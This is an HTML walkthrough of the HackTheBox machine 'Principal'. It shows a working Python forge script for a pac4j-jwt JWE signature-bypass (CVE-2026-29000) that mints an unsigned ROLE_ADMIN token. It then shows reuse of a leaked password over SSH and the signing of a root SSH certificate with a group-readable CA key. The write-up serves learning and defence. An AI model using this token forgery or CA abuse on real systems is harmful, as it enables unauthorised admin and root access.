@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Principal — S. Markakis</title>
+<meta name="description" content="A pac4j-jwt token that is encrypted (JWE) but whose inner signature is never verified (CVE-2026-29000) lets you forge a ROLE_ADMIN session; an admin API then leaks an SSH password, and a group-readable SSH CA private key lets you sign your own root certificate.">
+<meta property="og:title" content="HTB: Principal — S. Markakis">
+<meta property="og:description" content="A pac4j-jwt token that is encrypted (JWE) but whose inner signature is never verified (CVE-2026-29000) lets you forge a ROLE_ADMIN session; an admin API then leaks an SSH password, and a group-readable SSH CA private key lets you sign your own root certificate.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-principal.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-principal.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-principal.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-principal.html">
+
+
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-principal.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-principal-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-principal.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Principal",
+  "description": "A pac4j-jwt token that is encrypted (JWE) but whose inner signature is never verified (CVE-2026-29000) lets you forge a ROLE_ADMIN session; an admin API then leaks an SSH password, and a group-readable SSH CA private key lets you sign your own root certificate.",
+  "datePublished": "2026-09-29",
+  "dateModified": "2026-09-29",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-principal.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-principal.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-principal"
+  },
+  "timeRequired": "PT11M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><strong style="color:var(--text-dark);">English</strong> &nbsp;·&nbsp; <a href="htb-principal-el.html" style="font-weight:600;">Ελληνικά</a></p>
+
+  <div class="post-header">
+    <h1>HTB: Principal</h1>
+    <div class="post-meta">
+      <span class="date">September 29, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">JWE signature confusion</span>
+      <span class="tag">Medium</span>
+      <span>&nbsp;11 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Principal is a Linux box that puts a single, tidy web application in front of you and asks a precise question about how it validates trust. The app is a Java service built on the <strong>pac4j</strong> security framework, and its session token is a <strong>JWE</strong> — an <em>encrypted</em> JWT. That encryption is real, and it is a trap: it makes the token opaque and feels like security, but the server only checks that the token was encrypted to its public key. It never checks that the JWT <em>inside</em> was actually signed. <strong>CVE-2026-29000</strong> is exactly that confusion. Because the encryption key is public — it is literally published at a JWKS endpoint so clients can verify tokens — anyone can build an unsigned <code>alg:none</code> JWT claiming <code>ROLE_ADMIN</code>, encrypt it themselves, and hand it back as a valid admin session. From the admin dashboard an API endpoint leaks an SSH password in plaintext; from that user, membership in a <code>deployers</code> group makes the platform's <strong>SSH certificate-authority private key</strong> readable — and a CA private key that <code>sshd</code> trusts is a machine that will vouch for any identity you ask it to, including root.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">unauthenticated</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pac4j JWE sig-confusion (CVE-2026-29000)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">forged ROLE_ADMIN token</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">admin API leaks SSH password</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">svc-deploy SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">read trusted SSH CA key</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sign a root cert</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>Two ports: SSH on 22 and a web application on 8080. The web server is Jetty, and it advertises the exact thing worth knowing straight out of a response header — the auth framework and its version:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">the header that names the target</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -sI http://&lt;target&gt;:8080/</span>
+<span class="po">HTTP/1.1 302 Found
+Server: Jetty
+</span><span class="py">X-Powered-By: pac4j-jwt/6.0.3</span><span class="po">
+Location: /login</span></div>
+  </div>
+
+  <p><strong>pac4j-jwt 6.0.3</strong> is a specific, current, and vulnerable version. The login page loads a single script, <code>/static/js/app.js</code>, and that file is unusually generous — it documents the entire token design in a header comment, presumably because the same schema constants have to match the server:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">app.js — the token design, handed to us</span></div>
+    <div class="term-body"><span class="pco"> * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ *
+ * JWT claims schema:
+ *   sub   - username
+ *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+ *   iss   - "principal-platform"
+ *   iat   - issued at (epoch)
+ *   exp   - expiration (epoch)</span>
+
+<span class="pco">// the token is stored in sessionStorage and sent as a Bearer header;</span>
+<span class="pco">// /api/users and /api/settings are gated to ROLE_ADMIN client-side</span></div>
+  </div>
+
+  <p>So the token is a two-layer object: an inner JWT (claims + an RS256 signature) wrapped inside a JWE envelope (RSA-OAEP-256 key wrapping, A128GCM content encryption). The public key needed for both "verifying" the token and — crucially — <em>encrypting</em> a new one is served, unauthenticated, at <code>/api/auth/jwks</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">/api/auth/jwks — the public encryption key</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s http://&lt;target&gt;:8080/api/auth/jwks</span>
+<span class="po">{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61i…"}]}</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — encryption is not authentication (CVE-2026-29000)</h2>
+
+  <p>Here is the flaw, stated plainly. A JWE proves one thing: whoever built the token had the recipient's <em>public</em> key. That is not a secret — it is published. Encrypting a JWT gives you confidentiality (nobody can read the claims in transit), but it says nothing about <em>who</em> issued the claims. Authenticity is the job of the inner JWT's <strong>signature</strong>, which must be verified against the issuer's key.</p>
+
+  <p><strong>CVE-2026-29000</strong> is that pac4j's JWE authenticator, in this configuration, decrypts the outer envelope and then trusts the claims of the inner JWT <em>without verifying its signature</em>. That collapses the whole design: since the encryption key is public, an attacker can mint their own token end to end. Build an inner JWT with <code>"alg":"none"</code> and an empty signature, set <code>role</code> to <code>ROLE_ADMIN</code>, then encrypt it to the server's own JWKS key. The server decrypts it, sees a well-formed JWT it can read, and never asks whether it was signed.</p>
+
+  <p>Concretely, in pac4j's own terms: <code>JwtAuthenticator</code> supports <strong>nested tokens</strong> — an inner, RS256-signed JWT wrapped inside an outer JWE — and takes an <code>EncryptionConfiguration</code> and a <code>SignatureConfiguration</code> as <em>independent</em> options. Principal wired up encryption but never enforced signing, so once the outer JWE decrypts, an inner <code>PlainJWT</code> (an unsigned token) is accepted as validated. The <code>kid</code> in the JWKS is even named <code>enc-key-1</code> — the server publishes its <em>encryption</em> key where a verifier would normally publish a <em>signature</em> key, which is the whole tell in one string.</p>
+
+  <figure style="margin:1.8rem 0;">
+    <svg viewBox="0 0 720 210" width="100%" role="img" aria-label="Diagram: a JWE envelope wraps an inner JWT whose signature segment is never verified" style="font-family:'JetBrains Mono',monospace;">
+      <rect x="8" y="34" width="704" height="150" rx="8" fill="var(--bg-code)" stroke="var(--text-dark)" stroke-width="1.5"/>
+      <text x="24" y="24" fill="var(--text-mid)" font-size="13" font-weight="600">JWE envelope · RSA-OAEP-256 (key wrap) + A128GCM (encrypt)</text>
+      <text x="700" y="24" text-anchor="end" fill="var(--t-green)" font-size="13" font-weight="700">server checks this ✓</text>
+      <rect x="30" y="86" width="660" height="76" rx="6" fill="var(--bg)" stroke="var(--border)" stroke-width="1"/>
+      <text x="46" y="76" fill="var(--text-mid)" font-size="12">inner JWT — what the server actually trusts</text>
+      <line x1="250" y1="86" x2="250" y2="162" stroke="var(--border)" stroke-width="1"/>
+      <line x1="480" y1="86" x2="480" y2="162" stroke="var(--border)" stroke-width="1"/>
+      <text x="60" y="120" fill="var(--text-dark)" font-size="13" font-weight="600">header</text>
+      <text x="60" y="142" fill="var(--text-mid)" font-size="12">alg: none</text>
+      <text x="268" y="120" fill="var(--text-dark)" font-size="13" font-weight="600">payload</text>
+      <text x="268" y="142" fill="var(--text-mid)" font-size="12">role: ROLE_ADMIN</text>
+      <text x="498" y="120" fill="var(--t-red)" font-size="13" font-weight="600" text-decoration="line-through">signature</text>
+      <text x="498" y="142" fill="var(--t-red)" font-size="12">✗ never verified</text>
+    </svg>
+    <figcaption style="font-size:.8rem;color:var(--text-mid);text-align:center;margin-top:.5rem;">The server validates the outer encryption and stops there. The inner signature — the only thing that proves <em>who</em> issued the claims — is never checked, so an attacker who owns the public key owns the token.</figcaption>
+  </figure>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">forge.py — unsigned inner JWT, wrapped in a JWE to the public key</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cat forge.py</span>
+<span class="po">import json, time, base64, urllib.request
+from jwcrypto import jwk, jwe
+
+T = "http://&lt;target&gt;:8080"
+b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+</span><span class="pco"># 1. pull the public encryption key straight from JWKS</span><span class="po">
+jwks = json.load(urllib.request.urlopen(T + "/api/auth/jwks"))
+key  = jwk.JWK(**jwks["keys"][0])
+
+</span><span class="pco"># 2. build an UNSIGNED inner JWT (alg:none, empty signature)</span><span class="po">
+now = int(time.time())
+hdr = {"alg": "none", "typ": "JWT"}
+pl  = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "principal-platform",
+       "iat": now, "exp": now + 3600}
+inner = b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(pl).encode()) + "."
+
+</span><span class="pco"># 3. wrap it in a JWE to the server's own key — RSA-OAEP-256 + A128GCM</span><span class="po">
+prot = {"alg": "RSA-OAEP-256", "enc": "A128GCM", "kid": "enc-key-1"}
+tok  = jwe.JWE(inner.encode(), recipient=key, protected=json.dumps(prot))
+print(tok.serialize(compact=True))</span></div>
+  </div>
+
+  <div class="alert alert-info"><strong>Why <code>alg:none</code> works here:</strong> the server never runs the signature check, so it does not matter what the inner header claims. <code>none</code> is simply the least effort — no key, no signing step — and it sails through because the verification that would reject it was skipped entirely. The public key does all the heavy lifting on the encryption side, which is the only side the server actually validates.</div>
+
+  <p>Present the forged token as a bearer credential and the admin API opens up. <code>/api/dashboard</code> confirms the identity the server derived from our token — <code>admin</code> / <code>ROLE_ADMIN</code> — and <code>/api/settings</code> is where the box hands over the next step:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">forged admin token → the admin API</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">TOKEN=$(python3 forge.py)</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Authorization: Bearer $TOKEN" http://&lt;target&gt;:8080/api/dashboard | jq .user</span>
+<span class="pg">{ "username": "admin", "role": "ROLE_ADMIN" }</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Authorization: Bearer $TOKEN" http://&lt;target&gt;:8080/api/settings | jq .security</span>
+<span class="po">{
+  "authFramework": "pac4j-jwt", "authFrameworkVersion": "6.0.3",
+  "jwtAlgorithm": "RS256", "jweAlgorithm": "RSA-OAEP-256", "jweEncryption": "A128GCM",
+  </span><span class="py">"encryptionKey": "&lt;redacted — a plaintext deploy secret&gt;"</span><span class="po">,
+  "tokenExpiry": "3600s"
+}</span></div>
+  </div>
+
+  <div class="alert alert-warn"><strong>The leak:</strong> an admin-only settings endpoint returns a live secret in cleartext, labelled <code>encryptionKey</code>. The value reads like a deployment passphrase — and the same <code>/api/settings</code> response advertises that the infrastructure uses SSH certificate authentication with a CA under <code>/opt/principal/ssh/</code>, and <code>/api/users</code> lists a <code>svc-deploy</code> service account "for automated deployments via SSH certificate auth." Two halves of the same hint.</div>
+
+  <!-- ══ USER ══ -->
+  <h2>User — a leaked password, reused for SSH</h2>
+
+  <p>The leaked secret is not tied to the crypto at all; it is reused as an SSH password. Sprayed across the usernames the <code>/api/users</code> listing already gave us, it lands on the deployment service account:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">user.txt</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sshpass -p '&lt;leaked secret&gt;' ssh svc-deploy@&lt;target&gt; 'id; cat user.txt'</span>
+<span class="pg">uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
+[redacted — user flag]</span></div>
+  </div>
+
+  <p>Note the second group: <code>deployers</code>. That is not decoration — it is the whole privilege-escalation path.</p>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — a CA private key you're allowed to read</h2>
+
+  <p>The settings endpoint pointed at <code>/opt/principal/ssh/</code>, and its own README explains what lives there: an RSA certificate authority that <code>sshd</code> trusts for certificate-based logins. The directory is owned <code>root:deployers</code> and group-readable — and <code>svc-deploy</code> is in <code>deployers</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">the CA, readable via the deployers group</span></div>
+    <div class="term-body"><span class="pd">svc-deploy@principal:~$ </span><span class="pc">ls -l /opt/principal/ssh/</span>
+<span class="po">-rw-r----- 1 root deployers  288 README.txt
+</span><span class="pg">-rw-r----- 1 root deployers 3381 ca</span><span class="po">        </span><span class="pco"># CA private key — group-readable</span><span class="po">
+-rw-r--r-- 1 root deployers  742 ca.pub</span>
+<span class="pd">svc-deploy@principal:~$ </span><span class="pc">grep -ri trustedusercakeys /etc/ssh/</span>
+<span class="py">/etc/ssh/sshd_config.d/60-principal.conf:TrustedUserCAKeys /opt/principal/ssh/ca.pub</span></div>
+  </div>
+
+  <p>That one <code>sshd</code> directive is the game. <code>TrustedUserCAKeys</code> tells the daemon to accept <em>any</em> user certificate signed by that CA — the certificate <em>is</em> the authorization. So a CA private key you can read is not "a key on the box"; it is the authority to issue yourself a valid identity for any account, including root. There is no exploit to write. You just use the CA the way it was built to be used, but for a principal it was never meant to sign.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">sign a root certificate, log in as root</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc"># pull the CA private key down (readable as svc-deploy), then sign our own key for root</span>
+<span class="pd">$ </span><span class="pc">ssh-keygen -t ed25519 -N '' -f rootkey</span>
+<span class="pd">$ </span><span class="pc">ssh-keygen -s ca -I pwn-root -n root -V +2h rootkey.pub</span>
+<span class="pg">Signed user key rootkey-cert.pub: id "pwn-root" serial 0 for root valid ...</span>
+<span class="pd">$ </span><span class="pc">ssh -i rootkey -o CertificateFile=rootkey-cert.pub root@&lt;target&gt; 'id; cat /root/root.txt'</span>
+<span class="pg">uid=0(root) gid=0(root) groups=0(root)
+[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-warn"><strong>The <code>-n root</code> detail:</strong> this <code>sshd</code> sets no <code>AuthorizedPrincipalsFile</code>, so the default rule applies — the certificate's principal list must contain the login username. Sign with <code>-n root</code> so the cert is valid for the <code>root</code> account; omit it and the login is refused even though the CA signature itself is perfectly valid. It is the difference between a correctly-signed cert and a cert that is <em>correctly-signed for the account you are using</em>.</div>
+
+  <!-- ══ RECAP ══ -->
+  <h2>The whole chain, one screen</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">recap</span></div>
+    <div class="term-body"><span class="pco"># 1. header names the target: X-Powered-By: pac4j-jwt/6.0.3 ; JWKS key is public</span>
+<span class="pc">curl -s http://&lt;target&gt;:8080/api/auth/jwks</span>
+
+<span class="pco"># 2. CVE-2026-29000: JWE decrypted but inner signature never verified</span>
+<span class="pco">#    forge alg:none JWT{role:ROLE_ADMIN}, encrypt to the public key, send as Bearer</span>
+<span class="pc">python3 forge.py  # -> RSA-OAEP-256 + A128GCM JWE</span>
+
+<span class="pco"># 3. admin /api/settings leaks a plaintext secret -> reused as an SSH password</span>
+<span class="pc">sshpass -p '&lt;leaked&gt;' ssh svc-deploy@&lt;target&gt;   # user.txt ; group: deployers</span>
+
+<span class="pco"># 4. deployers can read the TrustedUserCAKeys CA private key</span>
+<span class="pc">ssh-keygen -s ca -I x -n root -V +2h rootkey.pub</span>
+<span class="pc">ssh -i rootkey -o CertificateFile=rootkey-cert.pub root@&lt;target&gt;   # root.txt</span></div>
+  </div>
+
